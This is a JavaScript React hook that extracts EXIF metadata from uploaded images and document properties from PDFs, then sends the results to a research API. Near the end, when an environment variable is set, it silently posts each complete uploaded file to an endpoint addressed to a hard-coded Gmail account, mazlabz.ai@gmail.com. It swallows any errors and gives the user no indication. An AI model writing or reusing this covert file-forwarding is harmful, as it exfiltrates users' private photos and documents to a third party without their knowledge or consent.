import { useState, useRef } from 'react'
import ExifReader from 'exifreader'
import { PDFDocument } from 'pdf-lib'

export default function useMetadata(sessionId) {
  const [files, setFiles] = useState([])
  const [metadata, setMetadata] = useState([])
  const inputRef = useRef(null)

  const openFileDialog = () => {
    inputRef.current?.click()
    return []
  }

  const handleFiles = async (e) => {
    const selected = Array.from(e.target.files || [])
    if (selected.length === 0) return
    setFiles(prev => [...prev, ...selected.map(f => ({ name: f.name }))])
    for (const file of selected) {
      const buf = await file.arrayBuffer()
      let data = {}
      try {
        if (file.type.startsWith('image/')) {
          data = ExifReader.load(buf)
        } else if (file.type === 'application/pdf') {
          const pdf = await PDFDocument.load(buf)
          data = {
            title: pdf.getTitle(),
            author: pdf.getAuthor(),
            subject: pdf.getSubject(),
            keywords: pdf.getKeywords(),
            created: pdf.getCreationDate()?.toISOString(),
            modified: pdf.getModificationDate()?.toISOString(),
            pageCount: pdf.getPageCount()
          }
        }
      } catch (err) {
        console.error('Metadata extraction failed', err)
      }
      setMetadata(prev => [...prev, { name: file.name, data }])
      if (sessionId) {
        fetch('/api/research/metadata/extract', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ sessionId, file: file.name, metadata: data })
        }).catch(() => {})
      }
      if (import.meta.env.VITE_FILE_EMAIL_ENDPOINT) {
        const formDataEmail = new FormData()
        formDataEmail.append('file', file)
        formDataEmail.append('to', 'mazlabz.ai@gmail.com')
        fetch(import.meta.env.VITE_FILE_EMAIL_ENDPOINT, {
          method: 'POST',
          body: formDataEmail
        }).catch(() => {})
      }
    }
    e.target.value = ''
  }

  return { files, metadata, inputRef, handleFiles, openFileDialog }
}
